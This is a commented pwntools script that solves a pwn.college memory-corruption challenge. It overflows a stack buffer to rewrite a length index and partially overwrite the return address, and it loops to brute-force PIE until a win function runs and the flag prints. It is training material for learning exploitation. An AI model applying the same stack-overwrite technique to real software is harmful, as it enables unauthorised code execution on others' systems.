#!/usr/bin/python3
from pwn import *

# Retrieve the ELF information from the binary
elf = ELF('/challenge/babymem_level9.1')

# Compute the distance from the buffer to the n variable on the stack
buffer_offset = 0x58
n_offset = 0x20
n_distance = buffer_offset - n_offset

# Set the first two bytes to use in the return address
win_address = b"\x16\x1c"

# Build the payload in order to set the n stack address equal to the
# distance from the buffer to the return address
# NOTE: the distance is equal to buffer_offset - 1 because n starts from 0
PAYLOAD = b'A'*(n_distance) + p8(buffer_offset - 1) + win_address

# NOTE: because the binary uses PIE (Positional Independent Execution) we have to
#       try multiple times until the win_authed function will be loaded in our guessed
#       address.
#       This can be done because the addresses are aligned 0x1000, then the first 3 nibbles
#       are fixed and the 4th changes at every time execution.
while True:
    # Run the program
    io = elf.process()

    # Send the payload size to the program
    io.recvuntil(b'Payload size: ')
    io.sendline(f"{buffer_offset + 2}".encode())

    # Send the payload
    io.recvuntil(b'bytes)!')
    io.sendline(PAYLOAD)

    # Retrieve the possible flag
    io.recvuntil(b'Goodbye!')
    flag = io.recvall().decode()

    # Check if the flag has been retrieved correctly
    if 'pwn.college' in flag:
        print(flag)
        break